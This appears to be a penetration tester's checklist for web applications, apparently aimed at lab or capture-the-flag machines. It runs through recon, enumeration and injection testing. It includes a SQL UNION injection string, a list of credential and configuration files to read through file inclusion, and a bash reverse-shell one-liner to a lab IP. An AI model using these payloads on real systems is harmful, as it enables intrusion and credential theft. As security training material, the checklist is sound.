## Passive Recon
1. Look at public DNS records for domains/subdomains to enumerate
2. Look at certificates and other public info for domains/subdomains to enumerate
3. Public Domain Information

## Active Recon

1. Add domain to /etc/hosts file (if applicable)

2. Run directory/page brute force discovery
	- First fuzz for extension (if available)
	- If extension is discovered, then fuzz for directories and other pages (with extension appended)

3. Look in robots.txt file or sitemaps.xml for hidden endpoints
	- [https://www.example.com/robots.txt](https://www.example.com/robots.txt)
	- [https://www.example.com/sitemap.xml](https://www.example.com/sitemap.xml

4. Run subdomain/vhost brute force discovery (RUN MULTIPLE WORDLISTS)
	- Run subdomain brute force discovery (External Only)
	- Run vhosts brute force discovery (Internal & External)

5. Crawl the webpage for all links
	- Web Crawling / Robots
	- Crawling with FinalRecon
	- Crawling with ZAP Proxy
    
6. Look for comments in HTML for sensitive information
	- Check all crawled and discovered pages

7. Capture server errors (e.g. 500, 403) that might leak tech stack info

8. Look for vulnerabilities in Web Server technologies being used
	- Use Wappalyzer to discover web server technologies in browser
	- Use BuiltWith to discover web server technologies (External only)
	- Use WhatWeb CLI tool to discover web server technologies
	- Scan the webserver with Nikto to discover web technologies and vulnerabilities
	- Scan the webserver with NMAP and web discovery scripts
	- Attempt banner grabbing the webserver with curl
	- Discover Web Application Firewalls (WAFs) with Wafw00f

9. If the webserver is determined to be running NodeJS or MongoDB, look for NOSQL injection vulnerabilities

10. Look for web service versions on discovered pages (Jenkins, WP, blog platforms, etc). Use enumeration techniques depending on the technology:
	- Look for CMS or app-specific files (wp-content, .git/, etc.)
	- WordPress Enumeration
	- Joomla Enumeration
	- Drupal Enumeration
	- Tomcat Enumeration
	- Jenkins Enumeration
	- IIS Tilde Enumeration
	- Other

11. Look for vulnerabilities in discovered web service versions and/or technologies
	- Search metasploit for service exploits with the discovered version
	- Search ExploitDB for service exploits with the discovered version
	- Search Google for "{Service} {Version} Exploit GitHub"

12. Look for login pages to test default or weak credentials
	- Default Credential lists
	- Login Brute Forcing
	- ✅ Check for password reset or recovery mechanisms
	- ✅ Review cookies & sessions (flags like Secure, HttpOnly)
	- ✅ Test for session fixation or missing CSRF protections  

13. Test submitting data on EVERY user input field and looking at interaction with Burp Suite
	- Intercepting Web Requests
	- Test SQL Injection on login pages to try and bypass them

14. If input appears to be used in a system command, test for command injection

15. If a file upload functionality exists, test for file upload vulnerabilities

16. If the webserver appears to be populating data from a database, test for SQL Injection
	- Test for SQL UNION Injection separately (test' UNION select 1-- -)
	- Any input fields, test with sqlmap
	- Test SQL Injection on login pages to try and bypass them

17. If Accounts, Pages, or other things on the webpage seem to sequential and accessible in a GET or POST request, check for IDOR vulnerabilities.

18. If GET parameters seem to be referencing local files on the system, test for file inclusion vulnerabilities / path traversal.

- Run an LFI (Local File Inclusion)Automation scan against any parameters that reference a file, especially in GET requests like [http://example.com/index.php?page=goober.html](http://example.com/index.php?page=goober.html)
	- Good Candidate Example: `prepod-marketing.trick.htb/index.php?page=contact.html`
	- If LFI exists, look for the following payloads:
		- /etc/passwd
	    - /var/mail/{username} (if we can send emails to user then we can send and access a PHP webshell)
		- /home/{username}/.ssh/id_rsa
		- Webserver source code (index page and other interesting pages)
		- /etc/nginx/nginx.conf
		- /etc/nginx/sites-enabled/default
		- /etc/nginx/sites-available/default
		- /etc/apache2/sites-enabled/default
		- /etc/apache2/sites-available/default
		- /var/log/apache2/access.log (for log poisoning)
		- /var/log/nginx/access.log (for log poisoning)
		- Any file paths from error pages

18. Check user input fields for XSS  

19. Check different HTTP verbs to bypass access controls or injection validations

20. If XML input is accepted, test for XML External Entity (XXE) vulnerabilities

21. If the webserver has a web socket or API that is reachable, check if the POST/GET requests are injectable with SQLMAP
	- Websocket / API Injection
## Shells and Payloads
1. Linux Reverse Shells

2. Windows Reverse Shells    

3. Web Reverse Shells 

4. Going from webshell to reverse shell on Linux:
	- `bash -c 'bash -i >& /dev/tcp/10.10.14.8/7777 0>&1`
	- Make sure to URL encode the payload
## Documentation and Reporting
Follow the Bruno Rocha Moura Method for documenting findings  

